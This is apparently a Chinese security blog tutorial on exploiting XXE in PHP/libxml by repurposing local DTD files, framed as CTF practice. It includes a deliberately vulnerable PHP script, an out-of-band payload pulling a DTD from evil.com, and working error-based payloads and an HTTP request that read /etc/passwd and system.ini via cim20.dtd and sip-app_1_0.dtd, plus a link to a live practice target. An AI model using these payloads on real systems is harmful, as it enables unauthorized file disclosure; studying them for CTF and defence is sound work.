[](http://lonelyrain.me/2017/10/10/PHP%E8%87%AA%E5%8A%A8%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/)

原创：Mr.zhang合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

## 0x00 前言  

现在题目出XXE一般都是考如何获取到XXE所包含文件的数据，即如何把数据泄露出来。常用的方法有：引入外部服务器或者外部dtd文件，来实现OOB带外信息传送，如果服务器和你的VPS之间存在防火墙，那数据往往无法带出，这时候可以利用最近的比赛中都喜欢考通过本地DTD文件实现XXE攻击，下面就来学习总结一下这种方式。

## 0x01 环境  

存在xxe漏洞的文件

<?php libxml_disable_entity_loader (false); $xmlfile =
file_get_contents('php://input'); $dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds =
simplexml_import_dom($dom); echo $creds; ?>

在部署的时候需要注意libxml的版本，在libxml2.9.1某个版本以前parser.c/xmlStringLenDecodeEntities函数存在XML外部实体漏洞，可使上下文独立的攻击者读取任意文件或造成拒绝服务

libxml在2.9.1版本及以后默认禁用外部实体

php --ri libxml libxml libXML support => active libXML Compiled Version =>
2.9.9 libXML Loaded Version => 20903 libXML streams => enabled

## 0x02 正文  

在平常的XXE利用方式中，我们通常会加载外部dtd文件来进行利用

请求payload：

<?xml version="1.0" ?> <!DOCTYPE message [ <!ENTITY % ext SYSTEM
"http://evil.com/ext.dtd"> %ext; ]> <message></message>

ext.dtd的内容：

<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25;
error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;

但是这种方式具有其局限性

第一：存在XXE的服务器与evil.com服务器可能存在某种方式的阻隔，如防火墙。

第二：libxml在2.9.1之后禁用了外部实体

这个时候我们无法通过外部实体的方式来进行XXE的利用。

如果我们直接把DTD部分放入请求payload中

<?xml version="1.0" ?> <!DOCTYPE message [ <!ENTITY % file SYSTEM
"file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM
'file:///nonexistent/%file;'>"> %eval; %error; ]> <message></message>

将会返回如下错误：

The parameter entity reference “%file;” cannot occur within markup in the
internal subset of the DTD

外部DTD允许我们在一个实体里包含另一个实体，但是在内部DTD中，这种行为是禁止的。

那内部DTD是否可以进行利用呢？

这里介绍本文的方法，该方法由Arseniy Sharoglazov在文章

<https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/>提出，在今年的比赛中已经出现多次了。

在内部DTD中使用外部DTD的内容，只需要在目标主机上强制执行本地DTD文件，并在其中重新定义一些参数实体引用

这个方法只需要知道本地DTD文件的路径，并且在该DTD中定义了实体变量并且进行了引用。

比如在ubuntu16.04中，我使用全局搜索得到以下的一些原生dtd文件：

//find / name "*.dtd" /usr/share/sgml/metacity-common/metacity-theme.dtd
/usr/share/sgml/dtd/xml-core/catalog.dtd /usr/share/sgml/gconf/gconf-1.0.dtd
/usr/share/gdb/syscalls/gdb-syscalls.dtd /usr/share/djvu/pubtext/DjVuOCR.dtd
/usr/share/djvu/pubtext/DjVuMessages.dtd /usr/share/djvu/pubtext/DjVuXML-s.dtd
/usr/share/avahi/avahi-service.dtd /usr/share/glib-2.0/schemas/gschema.dtd
/usr/share/X11/xkb/rules/xkb.dtd /usr/share/doc/libxml-parser-perl/examples/ctest.dtd /usr/share/xml/schema/xml-core/tr9401.dtd
/usr/share/xml/schema/xml-core/catalog.dtd
/usr/share/gtksourceview-3.0/language-specs/language.dtd
/usr/share/yelp/dtd/docbookx.dtd /usr/share/mobile-broadband-provider-info/serviceproviders.2.dtd /usr/share/libgweather/locations.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd 。。。。。。 。。。。。。

然后我需要在这些dtd中找到符合我的要求的dtd，比如在这里的

/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd 和
/usr/share/libgweather/locations.dtd 和 /usr/share/yelp/dtd/docbookx.dtd

都是符合要求的，这里使用sip-app_1_0.dtd为例

其主要内容如下

<!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of"> <!ELEMENT pattern (%condition;)>

我们的payload按照如下构造：

<?xml version="1.0" ?> <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM
"file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"> <!ENTITY %
condition 'aaa)> <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY
&#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
&#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error;
<!ELEMENT aa (bb'> %local_dtd; ]>

其中

<!ENTITY % local_dtd SYSTEM
"file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">

为强制执行本地DTD文件，一开始我看到payload中的

<!ENTITY % condition 'aaa)> 。。。 <!ELEMENT aa (bb'>

觉得很奇怪，这是什么写法，后来对应着dtd的内容来看，发现，这里是相当于做了一个闭合，可以按sql注入那种方式去理解这里的xxe，因为

<!ELEMENT pattern (%condition;)>

对condition实体进行了引用，所以会把condition内容替换进来

而我们在强制执行本地DTD文件以后，是可以重新定义该文件中的一些参数实体引用的，当我们重新定义了该参数实体时，就可以构造而已的payload使得其替换后符合xml的语法，并正常执行我们的xxe的payload。

写到这，可能很多同学已经明白了，这种方法的关键在于怎么寻找本地DTD以及如何闭合。

很多Linux系统会自带DTD文件，比如Ubuntu、CentOS、Arch，另外还有openjdk的docker容器中也有少量的DTD文件。Windows中也有DTD文件，在Windows中有两个DTD文件一般都会存在

C:/Windows/System32/wbem/xml/cim20.dtd C:/Windows/System32/wbem/xml/wmi20.dtd

其重要内容为：

<!ENTITY % CIMName "NAME CDATA #REQUIRED"> ..... <!ENTITY % SuperClass
"SUPERCLASS CDATA #IMPLIED"> ..... <!ATTLIST QUALIFIER.DECLARATION %CIMName;
%CIMType; #REQUIRED ISARRAY (true|false) #IMPLIED %ArraySize;
%QualifierFlavor;> ..... <!ATTLIST CLASS %CIMName; %SuperClass;>

post包，假如使用SuperClass实体进行注入，payload如下

POST /test2.php HTTP/1.1 Host: localhost Accept-Encoding: gzip, deflate
Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0;
Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type:
application/x-www-form-urlencoded Content-Length: 447 <?xml version="1.0" ?>
<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM
"file:///C:/Windows/System32/wbem/xml/cim20.dtd"> <!ENTITY % SuperClass '>
<!ENTITY &#x25; file SYSTEM "file:///c:/windows/system.ini"> <!ENTITY &#x25;
eval "<!ENTITY &#x26;#x25; error SYSTEM
&#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '>
%local_dtd; ]> <message>any text</message>

这里大家可以自己尝试尝试使用其他实体注入时该怎么闭合？这也是挺有趣的。

这样就可以在报错中得到读取的文件内容了。

## 0x03 题目练习  

这个技巧在Google CTF 2019 bnv中以及OPPO OGeek CTF
2019里面都考了，OPPO的环境还开着，可以使用它来练手，题目提示了服务器使用tomcat8.5，这时候可以在docker中拉取相应的镜像，并全局搜索对应的dtd文件进行利用。

题目传送门：

<http://47.107.253.140:18080/webserver/>

## 0x04 参考  

<https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/>

<https://xz.aliyun.com/t/335XXE>相关的学习可以到合天网安实验室操作实验——XXE漏洞攻击与防御[课程:XXE漏洞攻击与防御(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=CCIDc75d-d37a-42d4-878b-6f130c004ad2?channelID=freebuf)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

